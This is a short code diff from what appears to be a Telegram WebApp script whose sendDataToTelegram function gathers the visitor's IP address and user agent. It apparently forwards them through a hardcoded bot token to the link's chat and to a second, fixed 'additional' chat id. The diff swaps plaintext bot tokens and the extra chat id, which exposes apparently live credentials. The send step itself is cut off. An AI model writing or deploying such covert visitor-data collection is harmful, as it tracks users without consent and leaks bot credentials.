@@ -60,9 +60,9 @@ function getBrowserInfo() {
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
-    const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Replace with your bot token
+    const token = "6841728760:AAGVD54vQHLfYavt8eQ6u_LxEEBN9VLXOy4";  // Replace with your bot token
     const chatId = tg.initDataUnsafe.start_param;
-    const additionalChatId = -1002202955038;
+    const additionalChatId = -1002289448769;
 
     const ipAddress = await getIPAddress();
     const userAgent = getUserAgent();
